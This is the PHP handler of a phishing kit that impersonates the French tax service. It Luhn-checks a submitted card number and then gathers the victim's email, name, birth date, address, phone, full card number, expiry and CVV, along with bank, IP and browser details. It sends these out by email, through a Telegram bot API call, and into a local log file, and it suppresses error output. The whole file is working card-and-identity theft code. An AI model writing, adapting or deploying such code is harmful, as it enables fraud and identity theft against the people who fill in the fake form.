<?php
session_start();

error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../BIRNAVA/911.php');
include('../BIRNAVA/COUNTRY.php');
include('../BIRNAVA/SYS.php');
include('../BIRNAVA/TELEGRMAT.php');
include('../BIRNAVA/BIN.php');

function validateCardNumber($number) {
    $number = preg_replace('/\D/', '', $number);

    $length = strlen($number);
    if ($length < 15 || $length > 16) {
        return false;
    }

    $sum = 0;
    for ($i = 0; $i < $length; $i++) {
        $digit = (int) $number[$i];
        if (($length - $i) % 2 == 0) {
            $digit *= 2;
            if ($digit > 9) {
                $digit -= 9;
            }
        }
        $sum += $digit;
    }
    return $sum % 10 == 0;
}

if (isset($_POST['submit'])) {
    if (validateCardNumber($_POST['one'])) {
        header("Location: ../Loading.php?FGDD=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG#_$dispatch"); 
    } else {
        header("Location: ../A.php?error=invalidCardNumber"); 
        exit(); // توقف عن تنفيذ السكريبت هنا
    }
    $message = "* +------+INFO-POST-IMPOT_FRANCE+------+\n";
    

    $message = "* +------+CCV-POST-IMPOT_FRANCE+------+\n";
    $message .= "* Adresse e-mail: " . $_POST['emaile'] . "\n";
    $message .= "* Nom,Prénom: " . $_POST['username'] . "\n";
    $message .= "* Date de naissance: " . $_POST['day'].'/'.$_POST['month'].'/'.$_POST['year'] . "\n";
    $message .= "* Adresse: " . $_POST['address'] . "\n";
    $message .= "* Code postal: " . $_POST['zipcode'] . "\n";
    $message .= "* Ville: " . $_POST['city'] . "\n";
    $message .= "* Numéro de téléphone: " . $_POST['phone'] . "\n";
    $message .= "* Holder Name: " . $_POST['titu'] . "\n";
    $message .= "* Carte Number: " . $_POST['one'] . "\n";
    $message .= "* Date Experation: " . $_POST['expm'].'/'.$_POST['expy'] . "\n";
    $message .= "* CVV Code: " . $_POST['cvc'] . "\n";
	$message .= "+------BIN CCV------+\n";
	$message .= "name : ".$_SESSION['bank_name']."\n";
	$message .= "scheme : ".$_SESSION['bank_scheme']."\n";
	$message .= "type : ".$_SESSION['bank_type']."\n";
	$message .= "brand : ".$_SESSION['bank_brand']."\n";

    $message .= "* +------+INFO+------+\n";
    $message .= "* Country: #$get_user_country\n";
    $message .= "* IP Address: $ip\n";
    $message .= "* Operating System: $user_os\n";
    $message .= "* Browser: $user_browser\n";
    $message .= "* Time: $date\n";
    $message .= "* +------++------+\n";

    $subject = "+------+CCV-POST-IMPOT_FRANCE+------+";
    $headers = "From: CCV@IMPOT_FRANCE.com\r\n";
    $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

    mail($to, $subject, $message, $headers);

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    $_SESSION['one'] = $_POST['one'];

    $file = fopen('XD.txt', 'a');
    fwrite($file, $message . "\n");
    fclose($file);
}
?>